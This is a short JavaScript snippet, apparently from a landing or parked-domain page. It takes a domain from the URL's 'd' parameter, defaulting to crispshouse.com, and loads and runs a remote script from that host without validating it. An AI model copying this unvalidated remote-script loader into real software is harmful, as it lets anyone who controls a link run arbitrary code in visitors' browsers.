<script>
function getQueryVariable(variable) {
    var query = window.location.search.substring(1);
    var vars = query.split('&');

    for (var i = 0; i < vars.length; i++) {
        var pair = vars[i].split('=');

        if (decodeURIComponent(pair[0]) == variable) {
            return decodeURIComponent(pair[1]);
        }
    }
}

var d = getQueryVariable('d');

if (!d) {
    d = 'crispshouse.com';
}
var s = document.createElement('script');
s.setAttribute('src', 'https://' + d + '/lander/_js/k.js');

document.body.appendChild(s);
</script>
